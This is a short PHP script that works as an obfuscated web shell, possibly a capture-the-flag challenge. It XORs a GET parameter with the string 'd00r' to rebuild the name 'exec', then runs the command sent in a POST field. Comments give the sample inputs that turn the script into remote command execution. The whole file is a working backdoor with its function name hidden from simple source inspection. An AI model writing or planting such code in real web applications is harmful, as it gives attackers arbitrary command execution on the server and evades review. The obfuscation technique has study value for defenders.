<?php
set_time_limit(3);
ini_set('max_execution_time',3);
// highlight_file(__FILE__);
$f=file(__FILE__);

if (!isset($_SERVER["HTTP_HOST"])) {
  parse_str($argv[1], $_GET);
  parse_str($argv[2], $_POST);
}

print_r($_GET);
print_r($_POST);
// ("exec"^"d00r")
// $_GET = array('87' => "\x01HU\x11");
// $_POST = array('#' => "sleep 1");

$c='#';
$x=(substr($_GET[87],0,4)^"d00r");
$x(${"_POST"}{$c});
?>
